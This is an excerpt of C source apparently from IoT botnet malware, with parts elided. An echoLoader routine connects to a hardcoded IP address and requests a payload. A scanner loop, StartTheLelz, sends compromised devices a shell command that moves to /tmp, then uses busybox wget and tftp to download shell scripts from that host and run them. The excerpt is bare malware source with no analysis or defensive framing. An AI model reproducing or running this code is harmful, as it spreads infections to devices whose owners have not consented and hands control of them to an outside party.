...
void echoLoader()
{
        ...
        int fd;
        fd = socket_connect("46.166.161.174", 80); 
        write(fd, "GET /10hex\r\n", strlen("GET /10hex\r\n")); 
...
void StartTheLelz()
{
	...
	while(1)
	{
		for(i = 0; i < max; i++)
		{
			...
			case 8:
				{
					if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /mnt;busybox wget http://46.166.161.174/lolbin.sh; sh lolbin.sh;busybox tftp 46.166.161.174 -c get bin3.sh;sh bin3.sh;busybox tftp -r bin2.sh -g 46.166.161.174; sh bin2.sh\r\n", 202, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 9;
				}
				break;
